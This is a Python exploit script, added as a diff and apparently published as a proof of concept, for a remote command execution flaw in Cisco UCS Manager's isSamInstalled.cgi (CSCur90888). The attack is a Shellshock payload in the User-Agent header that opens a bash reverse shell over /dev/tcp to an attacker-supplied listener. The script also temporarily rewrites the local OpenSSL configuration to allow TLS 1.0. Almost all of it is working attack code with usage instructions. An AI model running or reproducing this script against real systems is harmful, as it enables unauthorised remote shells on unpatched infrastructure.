@@ -1,0 +1,133 @@
+# Exploit Title: Cisco UCS Manager 2.2(1d) - Remote Command Execution
+# Description: An unspecified CGI script in Cisco FX-OS before 1.1.2 on Firepower 9000 devices and Cisco Unified Computing System (UCS) Manager before 2.2(4b), 2.2(5) before 2.2(5a), and 3.0 before 3.0(2e) allows remote attackers to execute arbitrary shell commands via a crafted HTTP request, aka Bug ID CSCur90888.
+# Date: 1/15/2021
+# Exploit Author: liquidsky (J.McPeters)
+# Vulnerable Software: Cisco UCS Manager - 2.2(1d) -> [According to the vendor (cisco), this is known to impact versions prior to 3.0(2e).]
+# Vendor Homepage : https://www.cisco.com/c/en/us/products/servers-unified-computing/ucs-manager/index.html
+# Version: 2.2(1d), 2.2(3c)A
+# Cisco Reference: https://quickview.cloudapps.cisco.com/quickview/bug/CSCur90888
+# Tested On: Cisco UCS Manager - 2.2(1d) (Exploit ran with Debian 5.6.7-1kali1 (Kali 2020.1 x64))
+# Author Site: https://github.com/fuzzlove/Cisco-UCS-Manager-2.2-1d-Remote-Command-Execution
+# Special Notes: This application by default uses outdated TLS 1.0 for communication, so thats why there is a quickfix/temporary patch to 1.0 in openssl utilizing 'sed' (that gets changes back after exploitation).
+#
+# Greetz: wetw0rk, Fr13ndz, O.G.Xx25, MS, SS, JK, the S3 family, and last but NOT least droppunx ^_~
+#
+
+import sys, ssl, os, time
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+print "+-------------------------------------------------------------+"
+print
+print "-       Cisco Unified Computing System Manager CGI RCE "
+print
+print "          Cisco UCS Manager - 2.2(1d)"
+print
+print "-   PoC by: LiquidSky - 1/15/21  |  CISCO-BUG-ID:  CSCur90888   "
+print
+print "+-------------------------------------------------------------+"
+
+try:
+
+	target		= sys.argv[1]
+	shellip		= sys.argv[2]
+	shellport	= sys.argv[3]
+
+except IndexError:
+
+        print
+	print "- Usage: %s <vuln-site> <listener-ip> <listener-port>" % sys.argv[0]
+	print "- Example: %s https://ciscoucsmgr 192.168.1.123 443" % sys.argv[0]
+        print
+	sys.exit()
+	
+def ch3x_w00t():
+     if os.geteuid()==0:
+         print "[*] Running exploit as root."
+     else:
+         print "[!] You are not root, be sure you can change /etc/ssl/openssl.cnf"
+         print "[x] Most likely going to see an error..."
+         time.sleep(5)
+
+# Performs backup of openssl.cnf just in case and performs checks of existing vulnerable pages...
+def cisco_vuln():
+     ch3x_w00t()
+     print "[x] Backing up /etc/ssl/openssl.cnf to /etc/ssl/openssl.bak (just in case)"
+     os.system("cp /etc/ssl/openssl.cnf /etc/ssl/openssl.bak")
+     os.system("sed -i 's/MinProtocol = TLSv1.2/MinProtocol = TLSv1.0/' /etc/ssl/openssl.cnf")
+     print "[*] Checking vulnerable URL "
+     headers1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+     cisco_url = "" + target + "/ucsm/isSamInstalled.cgi"
+#Checking page
+     check = requests.get(cisco_url, headers=headers1, verify=False)
+#Grabbing response
+     res = check.text
+     if "true" in res:
+         return True
+     return False
+
+# Safety check - make sure the user is okay with the TLS1.0 temp fix
+# Shout out to Dean ^^ for keeping me polite...
+
+def exploit_question():
+      print "[x] Warning the service by default uses TLS1.0 so . . ."
+      print
+      print "[?] This exploit temporarily patches '/etc/ssl/openssl.cnf' to use TLS1.0 using 'sed' and then changes back to TLS1.2"
+      print
+      print "[!] A backup is placed in /etc/ssl/openssl.bak just to be safe..."
+      print
+      question = raw_input('[!] Do you wish to continue, "yes" or "no" ?')
+      if question == 'yes':
+          print
+          print "[!] Great attempting exploitation checks: " + target + '!'
+          cisco_vuln()
+      else:
+          print
+          print "[x] Stay safe m8 ;) - Read the source, its safe . . "
+          print
+          sys.exit()
+
+exploit_question()
+
+def cisco_response():
+     headers1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+     cisco_url = "" + target + "/ucsm/isSamInstalled.cgi"
+     request = requests.get(cisco_url, headers=headers1, verify=False)
+     if request.status_code == 200:
+         print "[x] Page seems to exist -- Possibly vulnerable?"
+     else:
+         print "[!] Page does not exist - Not vulnerable"
+         print "[x] Switching back to TLS v1.2 - backup file should be in /etc/ssl/openssl.bak (just in case)"
+         os.system("sed -i 's/MinProtocol = TLSv1.0/MinProtocol = TLSv1.2/' /etc/ssl/openssl.cnf")
+         sys.exit()
+
+def cisco_exploit():
+     cisco_url = "" + target + "/ucsm/isSamInstalled.cgi"
+     headers = {"User-Agent": "() { ignored;};/bin/bash -i >& /dev/tcp/" + shellip + "/" + shellport + " 0>&1", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+
+     print "[x] Sending Shell to IP: " + shellip + " Port: " + shellport + ""
+     print "[?] If this works you will see the exploit hang"
+
+     requests.get(cisco_url, headers=headers, verify=False)
+     print "[!] Shell Sent"
+
+cisco_exploit()
+
+def main():
+     if cisco_vuln():
+         print ""
+         print "[+] Perhaps success?"
+         print ""
+         print "  ^_~  got shellz?   - [ liquidsky | 2021 ]"
+         print
+         print "[x] Switching back to TLS v1.2 - backup file should be in /etc/ssl/openssl.bak (just in case)"
+         os.system("sed -i 's/MinProtocol = TLSv1.0/MinProtocol = TLSv1.2/' /etc/ssl/openssl.cnf")
+     else:         
+         print "[-] failure!"
+         print "[x] Switching back to TLS v1.2 - backup file should be in /etc/ssl/openssl.bak (just in case)"
+         os.system("sed -i 's/MinProtocol = TLSv1.0/MinProtocol = TLSv1.2/' /etc/ssl/openssl.cnf")
+ 
+if __name__ == "__main__":
+     main()
